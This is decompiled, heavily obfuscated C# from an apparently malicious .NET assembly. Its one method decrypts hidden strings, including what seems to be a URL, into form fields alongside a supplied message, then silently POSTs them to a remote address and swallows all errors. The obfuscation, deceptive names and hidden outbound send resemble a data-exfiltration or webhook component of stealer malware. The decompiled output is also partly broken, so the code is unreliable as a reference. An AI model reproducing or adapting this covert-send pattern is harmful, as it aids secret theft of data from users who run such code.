using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Runtime.InteropServices;

internal class ReferencedAssembly
{
	private string UnorderedEqualSignaling;

	private static int MultiplySubtract/* Not supported: data(02 00 00 00) */;

	private static int TotalDays/* Not supported: data(75 00 00 00) */;

	private static int FORMATFLAGS/* Not supported: data(6B 30 00 00) */;

	public ReferencedAssembly(string string_0)
	{
		UnorderedEqualSignaling = string_0;
	}

	public void VarArgMethod(string string_0)
	{
		//IL_03f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fe: Expected O, but got Unknown
		//IL_0406: Unknown result type (might be due to invalid IL or missing references)
		//IL_0410: Expected O, but got Unknown
		char[] array = new char[4] { '\0', '\u0003', '\u0005', '녯' };
		int[] array2 = new int[6] { 2, 3892, 0, 4, 471227, -97240 };
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		string string_ = string.Concat("㋴㋸", char.ToString('㋹') + char.ToString('㋣') + "㋲㋹㋣");
		int num = ((Convert.ToInt32("964c", 16) > -221433) ? Convert.ToInt32("101", 2) : (-54010));
		object[] array3 = new object[num];
		array3[array[0] * Convert.ToInt32("fff33ec5", 16)] = 940;
		array3[1] = (char)(0xBADE8u ^ (uint)Marshal.SizeOf(typeof(Vector64DebugView__1)));
		array3[2] = 121;
		array3[3 | array[1]] = Convert.ToInt32("557723", 8) - 180678;
		array3[array[2] & array2[3]] = Convert.ToInt32(char.ToString('c') + "eb", Marshal.SizeOf(typeof(Satellite)));
		_003CModule_003E.TryFormatDecimal(ref string_, array3);
		dictionary.Add(string_, string_0);
		string string_2 = string.Concat(char.ToString('\u0e64') + "\u0e62\u0e74", char.ToString('\u0e63') + char.ToString('\u0e7f') + "\u0e70\u0e7c\u0e74");
		object[] array4 = new object[Convert.ToInt32("6", 8)];
		array4[0] = Convert.ToInt32(char.ToString('4') + "01", 8);
		array4[array[3] - 45422] = TotalDays;
		array4[array2[0]] = (char)_003CModule_003E.Task_RunSynchronously_Continuation[_003CModule_003E.IsRunning[0]];
		array4[array2[4] - 471224] = false;
		array4[Convert.ToInt32(char.ToString('1') + "00", array2[0])] = string.Concat(char.ToString('\u001a'), char.ToString('\u0003'), char.ToString('B') + "\u0006\f");
		array4[5] = Marshal.SizeOf(typeof(set_CurrencyNegativePattern)) + -772783;
		_003CModule_003E.TryFormatDecimal(ref string_2, array4);
		string key = string_2;
		string string_3 = string.Concat("픋픬", "픱픷", "픪핥픗" + char.ToString('픤') + "픫픶픪픨픲픤픷픠");
		object[] array5 = new object[3];
		array5[0] = FORMATFLAGS;
		array5[Convert.ToInt32("1", 2)] = false;
		array5[1 << Convert.ToInt32("1", 8)] = ((array2[5] < -515149) ? 90643 : 42202);
		_003CModule_003E.TryFormatDecimal(ref string_3, array5);
		dictionary.Add(key, string_3);
		string string_4 = string.Concat("\u1943ᥔ", "\u1943ᥖ", char.ToString('\u1943') + char.ToString('ᥐ') + "\u197dᥗᥐ᥎");
		object[] array6 = new object[3];
		array6[_003CModule_003E.Deny[0]] = Marshal.SizeOf(typeof(Struct0));
		array6[944 >> Marshal.SizeOf(typeof(DomainUnload))] = 40;
		array6[2] = false;
		_003CModule_003E.TryFormatDecimal(ref string_4, array6);
		string key2 = string_4;
		string string_5 = string.Concat("㘉㘕" + "㘕㘑㘒㙛㙎㙎㘈㙏", "㘈㘃㘃㙏㘂㘎" + "㙎㙑㘇㘓㘵㘥㙘㙓㙎㘅㘈" + "㘒㘂㘎㘓㘅㙌㘀㘗㘀㘕㘀㘓㙌㙔㙐㙓㙏㘑㘏㘆");
		object[] array7 = new object[4];
		array7[(int)array[0] % -6362] = 3025;
		array7[Convert.ToInt32("1", 8)] = array2[1];
		array7[MultiplySubtract] = '᭜';
		char c = (char)array2[2];
		array7[3] = (byte)(int)c != 0;
		_003CModule_003E.TryFormatDecimal(ref string_5, array7);
		dictionary.Add(key2, string_5);
		Dictionary<string, string> dictionary2 = dictionary;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(UnorderedEqualSignaling, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary2)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
